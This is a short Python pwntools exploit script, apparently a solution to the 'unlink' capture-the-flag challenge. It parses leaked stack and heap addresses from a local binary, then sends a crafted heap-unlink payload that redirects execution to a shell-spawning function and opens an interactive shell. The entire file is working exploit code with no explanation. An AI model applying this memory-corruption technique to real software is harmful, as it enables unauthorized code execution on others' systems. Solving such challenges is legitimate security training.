# coding=utf-8
from pwn import *

p = process('./unlink')
p.recvuntil("leak: ")
stack_leak=p.recvline().strip()
stack_leak=int(stack_leak,16)
print p.recvuntil("leak: ")
heap_leak=p.recvline().strip()
heap_leak=int(heap_leak,16)
p.info("heap_leak:stack_leak  "+hex(heap_leak)+":"+hex(stack_leak))
shell_addr=0x80484EB
payload=p32(shell_addr)*2
payload+=p32(0)+p32(0x19)
payload+=p32(stack_leak+0x10-0x4)
payload+=p32(heap_leak+8+4)
p.sendline(payload)
p.interactive()
